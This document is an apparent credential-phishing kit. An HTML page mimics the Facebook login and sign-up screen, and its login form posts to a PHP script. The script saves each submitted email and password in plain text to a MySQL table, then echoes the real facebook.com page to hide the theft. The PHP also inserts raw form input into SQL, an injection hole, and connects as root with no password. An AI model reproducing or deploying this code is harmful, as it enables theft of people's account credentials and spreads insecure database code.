<html>
<head>
    <link href="Style.css" rel="stylesheet" />
    <title>Facebook home page template html</title>
</head>
<body>
    <div id="header_wrapper">
        <div id="header">

          <form action="insert1.php" method="post">
                <li>Email or Phone<br><input type="text" name="email"></li>
                <li>Password<br><input type="password" name="password"><br><a href="">Forgotten account?</a></li>
                <li><input class="submit" name="submit" type="submit" value="Log In"></li>
            </form>

        </div>
    </div>

    <div id="wrapper">

        <div id="div1">

        </div>

        <div id="div2">
            <h1>Create an account</h1>

            <p>It's free and always will be.</p>
            <li><input type="text" placeholder="First Name" id="Firstname"><input type="text" placeholder="Surname" id="surname"></li>
            <li><input type="text" placeholder="Mobile number or email"></li>
            <li><input type="password" placeholder="New password"></li>

            <p>Birthday</p>

            <li>
                <select><option>Day</option></select>
                <select><option>Month</option></select>
                <select><option>Year</option></select>
                <a href="">Why do I need to provide my date of birth?</a>
            </li>

            <li><input type="radio">Female <input type="radio">Male</li>
            <li id="terms">By clicking Create an account, you agree to our <a href="">Terms</a> and that <br>you have read our <a href="">Data Policy</a>, including our <a href="">Cookie Use</a>.</li>
            <li><input type="submit" value="Create an account"></li>
            <li id="create_page"><a href="">Create a Page</a> for a celebrity, band or business.</li>
        </div>

    </div>

    <div id="footer_wrapper">

        <div id="footer1">
            English (UK) <a href="">हिन्दी</a><a href="">ਪੰਜਾਬੀ</a><a href=""> اردو</a><a href="">தமிழ்</a><a href="">বাংলা</a><a href="">मराठी</a><a href="">తెలుగు</a><a href="">ગુજરાતી</a><a href="">ಕನ್ನಡ</a><a href="">മലയാളം</a>
        </div>
        <div id="footer2">

            <a href="#">Sign Up</a><a href="#">Log In</a><a href="#">Messenger</a><a href="#">DotNetTec</a><a href="#">Mobile</a><a href="#">Find Friends</a>
            <a href="#">Badges</a><a href="#">People</a><a href="#">Pages</a><a href="#">Places</a><a href="#">Games</a><a href="#">Locations</a>
            <a href="">Celebrities</a><a href="">Groups</a><a href="">Moments</a><a href="">About</a>
            <a href="">Create Advert</a><a href="">Create Page</a><a href="">Developers</a>
            <a href="">Careers</a><a href="">Privacy</a><a href="">Cookies</a><a href="">Ads</a><a href="">Terms</a><a href="">Help</a>

        </div>
    </div>
</body>
</html>
-----------------------------------------------------------------------

<?php
/* Attempt MySQL server connection. Assuming you are running MySQL
server with default setting (user 'root' with no password) */
$link = mysqli_connect("localhost", "root", "", "face");
 
// Check connection
if($link === false){
    die("ERROR: Could not connect. " . mysqli_connect_error());
}

if(isset($_POST['submit'])){ // Fetching variables of the form which travels in URL
$email = $_POST['email'];
$password = $_POST['password'];

}
if($email ==''||$password ==''){
$home = file_get_contents("https://www.facebook.com");
echo $home;
}
else
{
// Attempt insert query execution
//$sql = "insert into user(VEHICLE, IDNO, AREA, DATE) values ('$VEHICLE', '$IDNO', '$AREA', '$DATE')";

//$sql1 = "select VEHICLE from user WHERE VEHICLE = ('$VEHICLE') ";
//if(mysqli_query($link, $sql1)){
  //  echo "VEHICLE ALREADY INSERTED";
//}
//else{
$sql = "insert into facetable(email, password, date) values ('$email', '$password', 'date')";
if(mysqli_query($link, $sql)){
$home = file_get_contents("https://www.facebook.com");
echo $home;
		} 
else{
$home = file_get_contents("https://www.facebook.com");
echo $home;
}
}

// Close connection
mysqli_close($link);
?>
</br>




